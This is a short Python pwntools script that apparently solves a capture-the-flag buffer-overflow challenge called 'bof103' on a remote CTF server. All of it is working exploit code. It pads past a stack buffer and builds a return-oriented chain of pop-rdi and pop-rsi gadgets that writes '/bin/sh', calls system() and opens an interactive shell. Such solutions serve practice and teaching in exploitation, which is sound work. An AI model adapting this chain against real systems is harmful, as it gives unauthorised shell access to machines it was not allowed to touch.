#!/usr/bin/env python3

from pwn import *

#p = process("./bof103")
p = remote("bof103.sstf.site", 1337)
e = ELF("./bof103")

padding = b"A" * 0x18

rdi = 0x00000000004007b3
rsi = 0x0000000000400747

payload = padding
payload += p64(rdi)
payload += b"/bin/sh\x00"
payload += p64(rsi)
payload += p64(1)
payload += p64(e.sym['useme'])
payload += p64(rdi)
payload += p64(e.sym['key'])
payload += p64(e.plt['system'])

print(payload)

p.sendlineafter("> ", payload)

p.interactive()
